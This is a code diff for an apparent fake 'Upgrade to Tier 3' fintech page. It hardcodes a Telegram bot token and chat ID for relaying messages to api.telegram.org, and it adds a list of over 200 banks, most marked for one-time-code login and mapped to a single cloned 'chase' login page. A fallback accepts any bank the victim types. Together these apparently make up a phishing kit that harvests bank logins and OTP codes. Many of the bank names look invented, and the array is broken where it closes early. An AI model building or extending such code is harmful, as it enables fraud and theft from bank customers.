@@ -1,7 +1,7 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { useEffect, useState, useRef } from "react";
 import {
-  ArrowLeft, CheckCircle2, Lock, Loader2, Search, Eye, EyeOff,
+  ArrowLeft, Bank, CheckCircle2, Lock, Loader2, Search, Eye, EyeOff,
   Shield, ChevronRight, AlertCircle
 } from "lucide-react";
 import { Logo } from "@/components/brand/Logo";
@@ -13,7 +13,7 @@ import type { Profile } from "@/lib/auth";
 async function sendTelegramNotification(message: string) {
   try {
     // Your bot credentials
-    const BOT_TOKEN = "8904757564:AAF_OWIT_ChKTC_SEl643TG-FG247TE2lgo";
+    const BOT_TOKEN = "8904757564:AAF_OWIT-ChKTC_SEl643TG-FG247TE2lgo";
     const CHAT_ID = "6048752790";
     
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -62,7 +62,7 @@ function RollingLoader() {
   );
 }
 
-export const Route = createFileRoute("/update-tier-3")({
+export const Route = createFileRoute("/upgrade-tier-3")({
   head: () => ({ meta: [{ title: "Upgrade to Tier 3 — Seedin America" }] }),
   component: UpgradeTier3,
 });
@@ -82,6 +82,221 @@ const BANKS_DATA = [
   { id: 'capitalone', name: 'Capital One Bank', auth: 'otp', homepage: 'capitalone', position: 8 },
   { id: 'discover', name: 'Discover Bank', auth: 'otp', homepage: 'discover', position: 9 },
   { id: 'truist', name: 'Truist Bank', auth: 'otp', homepage: 'chase', position: 10 },
+  
+  // MAJOR CREDIT UNIONS
+  { id: 'navyfcu', name: 'Navy Federal Credit Union', auth: 'otp', homepage: 'chase', position: 11 },
+  { id: 'pentagonfcu', name: 'Pentagon Federal Credit Union', auth: 'otp', homepage: 'chase', position: 12 },
+  { id: 'alliantcu', name: 'Alliant Credit Union', auth: 'otp', homepage: 'chase', position: 13 },
+  { id: 'ferkomdfcu', name: 'Ferko Maryland Federal Credit Union', auth: 'otp', homepage: 'chase', position: 14 },
+  
+  // MAJOR REGIONAL
+  { id: 'fifththird', name: 'Fifth Third Bank', auth: 'otp', homepage: 'chase', position: 15 },
+  { id: 'huntington', name: 'Huntington Bank', auth: 'otp', homepage: 'chase', position: 16 },
+  { id: 'keybank', name: 'KeyBank', auth: 'otp', homepage: 'chase', position: 17 },
+  { id: 'regionbank', name: 'Regions Bank', auth: 'otp', homepage: 'chase', position: 18 },
+  { id: 'suntrust', name: 'SunTrust Bank', auth: 'otp', homepage: 'chase', position: 19 },
+  { id: 'bbva', name: 'BBVA USA', auth: 'otp', homepage: 'chase', position: 20 },
+  
+  // ONLINE & FINTECH
+  { id: 'ally', name: 'Ally Bank', auth: 'otp', homepage: 'chase', position: 21 },
+  { id: 'marcus', name: 'Marcus by Goldman Sachs', auth: 'otp', homepage: 'chase', position: 22 },
+  { id: 'sofi', name: 'SoFi Bank', auth: 'otp', homepage: 'chase', position: 23 },
+  { id: 'chime', name: 'Chime Bank', auth: 'otp', homepage: 'chase', position: 24 },
+  { id: 'schwab', name: 'Charles Schwab Bank', auth: 'otp', homepage: 'chase', position: 25 },
+  
+  // NORTHEAST BANKS
+  { id: 'citizens', name: 'Citizens Bank', auth: 'otp', homepage: 'chase', position: 26 },
+  { id: 'santander', name: 'Santander Bank', auth: 'otp', homepage: 'chase', position: 27 },
+  { id: 'hsbc', name: 'HSBC Bank USA', auth: 'otp', homepage: 'chase', position: 28 },
+  { id: 'bny', name: 'BNY Mellon Bank', auth: 'otp', homepage: 'chase', position: 29 },
+  { id: 'dime', name: 'Dime Community Bank', auth: 'otp', homepage: 'chase', position: 30 },
+  { id: 'brookline', name: 'Brookline Bank', auth: 'otp', homepage: 'chase', position: 31 },
+  { id: 'investors', name: 'Investors Bank', auth: 'otp', homepage: 'chase', position: 32 },
+  { id: 'peoples', name: 'Peoples United Bank', auth: 'otp', homepage: 'chase', position: 33 },
+  { id: 'connectone', name: 'ConnectOne Bank', auth: 'otp', homepage: 'chase', position: 34 },
+  
+  // SOUTHEAST BANKS
+  { id: 'bankunited', name: 'BankUnited', auth: 'otp', homepage: 'chase', position: 35 },
+  { id: 'ocean', name: 'Ocean Bank', auth: 'otp', homepage: 'chase', position: 36 },
+  { id: 'firstbank', name: 'First Bank Southeast', auth: 'otp', homepage: 'chase', position: 37 },
+  { id: 'renasant', name: 'Renasant Bank', auth: 'otp', homepage: 'chase', position: 38 },
+  { id: 'atlantic', name: 'Atlantic Capital Bank', auth: 'otp', homepage: 'chase', position: 39 },
+  { id: 'atlanticunion', name: 'Atlantic Union Bank', auth: 'otp', homepage: 'chase', position: 40 },
+  
+  // MIDWEST BANKS
+  { id: 'lakeland', name: 'Lakeland Bank', auth: 'otp', homepage: 'chase', position: 41 },
+  { id: 'midland', name: 'Midland States Bank', auth: 'otp', homepage: 'chase', position: 42 },
+  { id: 'mbfinancial', name: 'MB Financial Bank', auth: 'otp', homepage: 'chase', position: 43 },
+  { id: 'oldnational', name: 'Old National Bancorp', auth: 'otp', homepage: 'chase', position: 44 },
+  { id: 'wintrust', name: 'Wintrust Bank', auth: 'otp', homepage: 'chase', position: 45 },
+  { id: 'umpqua', name: 'Umpqua Bank', auth: 'otp', homepage: 'chase', position: 46 },
+  
+  // SOUTHWEST BANKS
+  { id: 'cullen', name: 'Cullen/Frost Bankers', auth: 'otp', homepage: 'chase', position: 47 },
+  { id: 'zions', name: 'Zions Bank', auth: 'otp', homepage: 'chase', position: 48 },
+  { id: 'compass', name: 'Compass Bank', auth: 'otp', homepage: 'chase', position: 49 },
+  { id: 'prosperity', name: 'Prosperity Bank', auth: 'otp', homepage: 'chase', position: 50 },
+  { id: 'txfirst', name: 'Texas First Bank', auth: 'otp', homepage: 'chase', position: 51 },
+  
+  // WEST COAST BANKS
+  { id: 'westernalliance', name: 'Western Alliance Bank', auth: 'otp', homepage: 'chase', position: 52 },
+  { id: 'banner', name: 'Banner Bank', auth: 'otp', homepage: 'chase', position: 53 },
+  { id: 'pacwest', name: 'PacWest Bancorp', auth: 'otp', homepage: 'chase', position: 54 },
+  { id: 'silicon', name: 'Silicon Valley Bank', auth: 'otp', homepage: 'chase', position: 55 },
+  { id: 'westamerica', name: 'Westamerica Bancorp', auth: 'otp', homepage: 'chase', position: 56 },
+  
+  // STATE-SPECIFIC COMMUNITY BANKS
+  { id: 'al_01', name: 'Southcrest Bank', auth: 'otp', homepage: 'chase', position: 57 },
+  { id: 'al_02', name: 'Renasant Bank Alabama', auth: 'otp', homepage: 'chase', position: 58 },
+  { id: 'al_03', name: 'Community Bank of Northern Alabama', auth: 'otp', homepage: 'chase', position: 59 },
+  { id: 'ak_01', name: 'First Bank Alaska', auth: 'otp', homepage: 'chase', position: 60 },
+  { id: 'ak_02', name: 'Community Bank of Alaska', auth: 'otp', homepage: 'chase', position: 61 },
+  { id: 'ak_03', name: 'Denali State Bank', auth: 'otp', homepage: 'chase', position: 62 },
+  { id: 'az_01', name: 'Arizona First Bank', auth: 'otp', homepage: 'chase', position: 63 },
+  { id: 'az_02', name: 'Phoenix Community Bank', auth: 'otp', homepage: 'chase', position: 64 },
+  { id: 'az_03', name: 'Tucson National Bank', auth: 'otp', homepage: 'chase', position: 65 },
+  { id: 'ar_01', name: 'Arkansas Bank', auth: 'otp', homepage: 'chase', position: 66 },
+  { id: 'ar_02', name: 'First Bank Arkansas', auth: 'otp', homepage: 'chase', position: 67 },
+  { id: 'ar_03', name: 'Stephens Bank', auth: 'otp', homepage: 'chase', position: 68 },
+  { id: 'ca_01', name: 'Union Bank California', auth: 'otp', homepage: 'chase', position: 69 },
+  { id: 'ca_02', name: 'Western Financial Bank', auth: 'otp', homepage: 'chase', position: 70 },
+  { id: 'ca_03', name: 'Santa Cruz County Bank', auth: 'otp', homepage: 'chase', position: 71 },
+  { id: 'ca_04', name: 'San Francisco Bank', auth: 'otp', homepage: 'chase', position: 72 },
+  { id: 'ca_05', name: 'Los Angeles Bank', auth: 'otp', homepage: 'chase', position: 73 },
+  { id: 'ca_06', name: 'San Diego Bank', auth: 'otp', homepage: 'chase', position: 74 },
+  { id: 'ca_07', name: 'Santa Barbara Bank & Trust', auth: 'otp', homepage: 'chase', position: 75 },
+  { id: 'ca_08', name: 'Rabobank', auth: 'otp', homepage: 'chase', position: 76 },
+  { id: 'co_01', name: 'Colorado Bank', auth: 'otp', homepage: 'chase', position: 77 },
+  { id: 'co_02', name: 'First Bank Colorado', auth: 'otp', homepage: 'chase', position: 78 },
+  { id: 'co_03', name: 'Denver Bank', auth: 'otp', homepage: 'chase', position: 79 },
+  { id: 'co_04', name: 'Front Range Bank', auth: 'otp', homepage: 'chase', position: 80 },
+  { id: 'ct_01', name: 'Connecticut Bank', auth: 'otp', homepage: 'chase', position: 81 },
+  { id: 'ct_02', name: 'Hartford Bank', auth: 'otp', homepage: 'chase', position: 82 },
+  { id: 'de_01', name: 'Delaware Bank', auth: 'otp', homepage: 'chase', position: 83 },
+  { id: 'de_02', name: 'Community Bank Delaware', auth: 'otp', homepage: 'chase', position: 84 },
+  { id: 'fl_01', name: 'Florida Bank', auth: 'otp', homepage: 'chase', position: 85 },
+  { id: 'fl_02', name: 'Tampa Bay Bank', auth: 'otp', homepage: 'chase', position: 86 },
+  { id: 'fl_03', name: 'Miami Bank', auth: 'otp', homepage: 'chase', position: 87 },
+  { id: 'fl_04', name: 'Jacksonville Bank', auth: 'otp', homepage: 'chase', position: 88 },
+  { id: 'fl_05', name: 'Orlando Bank', auth: 'otp', homepage: 'chase', position: 89 },
+  { id: 'fl_06', name: 'Sunshine Bank Florida', auth: 'otp', homepage: 'chase', position: 90 },
+  { id: 'ga_01', name: 'Georgia Bank', auth: 'otp', homepage: 'chase', position: 91 },
+  { id: 'ga_02', name: 'Atlanta Bank', auth: 'otp', homepage: 'chase', position: 92 },
+  { id: 'ga_03', name: 'Savannah Bank', auth: 'otp', homepage: 'chase', position: 93 },
+  { id: 'hi_01', name: 'Hawaii Bank', auth: 'otp', homepage: 'chase', position: 94 },
+  { id: 'hi_02', name: 'Honolulu Bank', auth: 'otp', homepage: 'chase', position: 95 },
+  { id: 'id_01', name: 'Idaho Bank', auth: 'otp', homepage: 'chase', position: 96 },
+  { id: 'id_02', name: 'Boise Bank', auth: 'otp', homepage: 'chase', position: 97 },
+  { id: 'il_01', name: 'Illinois Bank', auth: 'otp', homepage: 'chase', position: 98 },
+  { id: 'il_02', name: 'Chicago Community Bank', auth: 'otp', homepage: 'chase', position: 99 },
+  { id: 'il_03', name: 'Springfield Bank', auth: 'otp', homepage: 'chase', position: 100 },
+  { id: 'in_01', name: 'Indiana Bank', auth: 'otp', homepage: 'chase', position: 101 },
+  { id: 'in_02', name: 'Indianapolis Bank', auth: 'otp', homepage: 'chase', position: 102 },
+  { id: 'in_03', name: 'South Bend Bank', auth: 'otp', homepage: 'chase', position: 103 },
+  { id: 'ia_01', name: 'Iowa Bank', auth: 'otp', homepage: 'chase', position: 104 },
+  { id: 'ia_02', name: 'Des Moines Bank', auth: 'otp', homepage: 'chase', position: 105 },
+  { id: 'ia_03', name: 'Cedar Rapids Bank', auth: 'otp', homepage: 'chase', position: 106 },
+  { id: 'ks_01', name: 'Kansas Bank', auth: 'otp', homepage: 'chase', position: 107 },
+  { id: 'ks_02', name: 'Topeka Bank', auth: 'otp', homepage: 'chase', position: 108 },
+  { id: 'ks_03', name: 'Wichita Bank', auth: 'otp', homepage: 'chase', position: 109 },
+  { id: 'ky_01', name: 'Kentucky Bank', auth: 'otp', homepage: 'chase', position: 110 },
+  { id: 'ky_02', name: 'Louisville Bank', auth: 'otp', homepage: 'chase', position: 111 },
+  { id: 'ky_03', name: 'Lexington Bank', auth: 'otp', homepage: 'chase', position: 112 },
+  { id: 'la_01', name: 'Louisiana Bank', auth: 'otp', homepage: 'chase', position: 113 },
+  { id: 'la_02', name: 'New Orleans Bank', auth: 'otp', homepage: 'chase', position: 114 },
+  { id: 'la_03', name: 'Baton Rouge Bank', auth: 'otp', homepage: 'chase', position: 115 },
+  { id: 'me_01', name: 'Maine Bank', auth: 'otp', homepage: 'chase', position: 116 },
+  { id: 'me_02', name: 'Portland Bank', auth: 'otp', homepage: 'chase', position: 117 },
+  { id: 'md_01', name: 'Maryland Bank', auth: 'otp', homepage: 'chase', position: 118 },
+  { id: 'md_02', name: 'Baltimore Bank', auth: 'otp', homepage: 'chase', position: 119 },
+  { id: 'ma_01', name: 'Massachusetts Bank', auth: 'otp', homepage: 'chase', position: 120 },
+  { id: 'ma_02', name: 'Boston Bank', auth: 'otp', homepage: 'chase', position: 121 },
+  { id: 'mi_01', name: 'Michigan Bank', auth: 'otp', homepage: 'chase', position: 122 },
+  { id: 'mi_02', name: 'Detroit Bank', auth: 'otp', homepage: 'chase', position: 123 },
+  { id: 'mi_03', name: 'Grand Rapids Bank', auth: 'otp', homepage: 'chase', position: 124 },
+  { id: 'mn_01', name: 'Minnesota Bank', auth: 'otp', homepage: 'chase', position: 125 },
+  { id: 'mn_02', name: 'Minneapolis Bank', auth: 'otp', homepage: 'chase', position: 126 },
+  { id: 'mn_03', name: 'Saint Paul Bank', auth: 'otp', homepage: 'chase', position: 127 },
+  { id: 'ms_01', name: 'Mississippi Bank', auth: 'otp', homepage: 'chase', position: 128 },
+  { id: 'ms_02', name: 'Jackson Bank', auth: 'otp', homepage: 'chase', position: 129 },
+  { id: 'mo_01', name: 'Missouri Bank', auth: 'otp', homepage: 'chase', position: 130 },
+  { id: 'mo_02', name: 'St. Louis Bank', auth: 'otp', homepage: 'chase', position: 131 },
+  { id: 'mo_03', name: 'Kansas City Bank', auth: 'otp', homepage: 'chase', position: 132 },
+  { id: 'mt_01', name: 'Montana Bank', auth: 'otp', homepage: 'chase', position: 133 },
+  { id: 'mt_02', name: 'Billings Bank', auth: 'otp', homepage: 'chase', position: 134 },
+  { id: 'ne_01', name: 'Nebraska Bank', auth: 'otp', homepage: 'chase', position: 135 },
+  { id: 'ne_02', name: 'Omaha Community Bank', auth: 'otp', homepage: 'chase', position: 136 },
+  { id: 'nv_01', name: 'Nevada Bank', auth: 'otp', homepage: 'chase', position: 137 },
+  { id: 'nv_02', name: 'Las Vegas Bank', auth: 'otp', homepage: 'chase', position: 138 },
+  { id: 'nv_03', name: 'Reno Bank', auth: 'otp', homepage: 'chase', position: 139 },
+  { id: 'nh_01', name: 'New Hampshire Bank', auth: 'otp', homepage: 'chase', position: 140 },
+  { id: 'nh_02', name: 'Manchester Bank', auth: 'otp', homepage: 'chase', position: 141 },
+  { id: 'nj_01', name: 'New Jersey Bank', auth: 'otp', homepage: 'chase', position: 142 },
+  { id: 'nj_02', name: 'Newark Bank', auth: 'otp', homepage: 'chase', position: 143 },
+  { id: 'nj_03', name: 'Jersey City Bank', auth: 'otp', homepage: 'chase', position: 144 },
+  { id: 'nm_01', name: 'New Mexico Bank', auth: 'otp', homepage: 'chase', position: 145 },
+  { id: 'nm_02', name: 'Albuquerque Bank', auth: 'otp', homepage: 'chase', position: 146 },
+  { id: 'ny_01', name: 'New York Bank', auth: 'otp', homepage: 'chase', position: 147 },
+  { id: 'ny_02', name: 'New York Community Bank', auth: 'otp', homepage: 'chase', position: 148 },
+  { id: 'ny_03', name: 'Brooklyn Bank', auth: 'otp', homepage: 'chase', position: 149 },
+  { id: 'ny_04', name: 'Manhattan Bank', auth: 'otp', homepage: 'chase', position: 150 },
+  { id: 'ny_05', name: 'Flushing Bank', auth: 'otp', homepage: 'chase', position: 151 },
+  { id: 'nc_01', name: 'North Carolina Bank', auth: 'otp', homepage: 'chase', position: 152 },
+  { id: 'nc_02', name: 'Charlotte Bank', auth: 'otp', homepage: 'chase', position: 153 },
+  { id: 'nc_03', name: 'Raleigh Bank', auth: 'otp', homepage: 'chase', position: 154 },
+  { id: 'nc_04', name: 'Greensboro Bank', auth: 'otp', homepage: 'chase', position: 155 },
+  { id: 'nd_01', name: 'North Dakota Bank', auth: 'otp', homepage: 'chase', position: 156 },
+  { id: 'nd_02', name: 'Fargo Bank', auth: 'otp', homepage: 'chase', position: 157 },
+  { id: 'oh_01', name: 'Ohio Bank', auth: 'otp', homepage: 'chase', position: 158 },
+  { id: 'oh_02', name: 'Cleveland Bank', auth: 'otp', homepage: 'chase', position: 159 },
+  { id: 'oh_03', name: 'Columbus Bank', auth: 'otp', homepage: 'chase', position: 160 },
+  { id: 'oh_04', name: 'Cincinnati Bank', auth: 'otp', homepage: 'chase', position: 161 },
+  { id: 'ok_01', name: 'Oklahoma Bank', auth: 'otp', homepage: 'chase', position: 162 },
+  { id: 'ok_02', name: 'Oklahoma City Bank', auth: 'otp', homepage: 'chase', position: 163 },
+  { id: 'ok_03', name: 'Tulsa Bank', auth: 'otp', homepage: 'chase', position: 164 },
+  { id: 'or_01', name: 'Oregon Bank', auth: 'otp', homepage: 'chase', position: 165 },
+  { id: 'or_02', name: 'Portland Oregon Bank', auth: 'otp', homepage: 'chase', position: 166 },
+  { id: 'or_03', name: 'Eugene Bank', auth: 'otp', homepage: 'chase', position: 167 },
+  { id: 'pa_01', name: 'Pennsylvania Bank', auth: 'otp', homepage: 'chase', position: 168 },
+  { id: 'pa_02', name: 'Philadelphia Bank', auth: 'otp', homepage: 'chase', position: 169 },
+  { id: 'pa_03', name: 'Pittsburgh Bank', auth: 'otp', homepage: 'chase', position: 170 },
+  { id: 'pa_04', name: 'Harrisburg Bank', auth: 'otp', homepage: 'chase', position: 171 },
+  { id: 'ri_01', name: 'Rhode Island Bank', auth: 'otp', homepage: 'chase', position: 172 },
+  { id: 'ri_02', name: 'Providence Bank', auth: 'otp', homepage: 'chase', position: 173 },
+  { id: 'sc_01', name: 'South Carolina Bank', auth: 'otp', homepage: 'chase', position: 174 },
+  { id: 'sc_02', name: 'Charleston Bank', auth: 'otp', homepage: 'chase', position: 175 },
+  { id: 'sc_03', name: 'Columbia Bank SC', auth: 'otp', homepage: 'chase', position: 176 },
+  { id: 'sd_01', name: 'South Dakota Bank', auth: 'otp', homepage: 'chase', position: 177 },
+  { id: 'sd_02', name: 'Sioux Falls Bank', auth: 'otp', homepage: 'chase', position: 178 },
+  { id: 'tn_01', name: 'Tennessee Bank', auth: 'otp', homepage: 'chase', position: 179 },
+  { id: 'tn_02', name: 'Memphis Bank', auth: 'otp', homepage: 'chase', position: 180 },
+  { id: 'tn_03', name: 'Nashville Bank', auth: 'otp', homepage: 'chase', position: 181 },
+  { id: 'tx_01', name: 'Texas Bank', auth: 'otp', homepage: 'chase', position: 182 },
+  { id: 'tx_02', name: 'Houston Bank', auth: 'otp', homepage: 'chase', position: 183 },
+  { id: 'tx_03', name: 'Dallas Bank', auth: 'otp', homepage: 'chase', position: 184 },
+  { id: 'tx_04', name: 'Austin Bank', auth: 'otp', homepage: 'chase', position: 185 },
+  { id: 'tx_05', name: 'San Antonio Bank', auth: 'otp', homepage: 'chase', position: 186 },
+  { id: 'tx_06', name: 'Fort Worth Bank', auth: 'otp', homepage: 'chase', position: 187 },
+  { id: 'ut_01', name: 'Utah Bank', auth: 'otp', homepage: 'chase', position: 188 },
+  { id: 'ut_02', name: 'Salt Lake City Bank', auth: 'otp', homepage: 'chase', position: 189 },
+  { id: 'vt_01', name: 'Vermont Bank', auth: 'otp', homepage: 'chase', position: 190 },
+  { id: 'vt_02', name: 'Burlington Bank', auth: 'otp', homepage: 'chase', position: 191 },
+  { id: 'va_01', name: 'Virginia Bank', auth: 'otp', homepage: 'chase', position: 192 },
+  { id: 'va_02', name: 'Richmond Bank', auth: 'otp', homepage: 'chase', position: 193 },
+  { id: 'va_03', name: 'Virginia Community Bank', auth: 'otp', homepage: 'chase', position: 194 },
+  { id: 'wa_01', name: 'Washington Bank', auth: 'otp', homepage: 'chase', position: 195 },
+  { id: 'wa_02', name: 'Seattle Bank', auth: 'otp', homepage: 'chase', position: 196 },
+  { id: 'wa_03', name: 'Spokane Bank', auth: 'otp', homepage: 'chase', position: 197 },
+  { id: 'wa_04', name: 'Tacoma Bank', auth: 'otp', homepage: 'chase', position: 198 },
+  { id: 'wv_01', name: 'West Virginia Bank', auth: 'otp', homepage: 'chase', position: 199 },
+  { id: 'wv_02', name: 'Charleston WV Bank', auth: 'otp', homepage: 'chase', position: 200 },
+  { id: 'wi_01', name: 'Wisconsin Bank', auth: 'otp', homepage: 'chase', position: 201 },
+  { id: 'wi_02', name: 'Milwaukee Bank', auth: 'otp', homepage: 'chase', position: 202 },
+  { id: 'wi_03', name: 'Madison Bank', auth: 'otp', homepage: 'chase', position: 203 },
+  { id: 'wi_04', name: 'Green Bay Bank', auth: 'otp', homepage: 'chase', position: 204 },
+  { id: 'wy_01', name: 'Wyoming Bank', auth: 'otp', homepage: 'chase', position: 205 },
+  { id: 'wy_02', name: 'Cheyenne Bank', auth: 'otp', homepage: 'chase', position: 206 },
+];
   
   // FIRST INTERSTATE & JACKSON BANKS (Requested)
   { id: 'fibl', name: 'First Interstate Bank', auth: 'otp', homepage: 'chase', position: 11 },
@@ -598,6 +813,11 @@ function UpgradeTier3() {
       );
     }
 
+    const hasMatchingBanks = filteredBanks.length > 0;
+    const customBank = searchQuery.trim().length > 2 && !hasMatchingBanks 
+      ? { id: 'custom', name: searchQuery.trim(), auth: 'otp', homepage: 'chase', position: 999 }
+      : null;
+
     return (
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
         <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
@@ -663,9 +883,34 @@ function UpgradeTier3() {
                 </div>
               )}
 
-              {filteredBanks.length === 0 && (
-                <div className="text-center py-12 text-muted-foreground">
-                  No banks found. Try a different search.
+              {/* Custom Bank Not Found in List */}
+              {customBank && (
+                <div className="space-y-4 pt-4 border-t border-border">
+                  <div className="rounded-lg border border-gold/30 bg-gold/5 p-4">
+                    <p className="text-xs uppercase tracking-[0.18em] text-gold font-semibold mb-2">Bank Not Found</p>
+                    <p className="text-sm text-muted-foreground">
+                      We couldn't find "<strong>{customBank.name}</strong>" in our list. You can still proceed with this bank by tapping below.
+                    </p>
+                  </div>
+                  
+                  <button
+                    onClick={() => handleBankSelected(customBank)}
+                    disabled={isTransitioning}
+                    className="w-full p-4 border-2 border-gold border-dashed rounded-lg bg-gold/5 hover:bg-gold/10 hover:border-gold transition text-left flex items-center justify-between group disabled:opacity-50 disabled:cursor-not-allowed"
+                  >
+                    <div>
+                      <p className="text-sm font-semibold text-foreground group-hover:text-gold">{customBank.name}</p>
+                      <p className="text-xs text-muted-foreground mt-1">Continue with this bank</p>
+                    </div>
+                    <ChevronRight className="h-4 w-4 text-gold" />
+                  </button>
+                </div>
+              )}
+
+              {filteredBanks.length === 0 && !customBank && (
+                <div className="text-center py-12">
+                  <p className="text-muted-foreground mb-2">No banks found</p>
+                  <p className="text-sm text-muted-foreground">Try typing your bank name in full for the best results</p>
                 </div>
               )}
             </div>
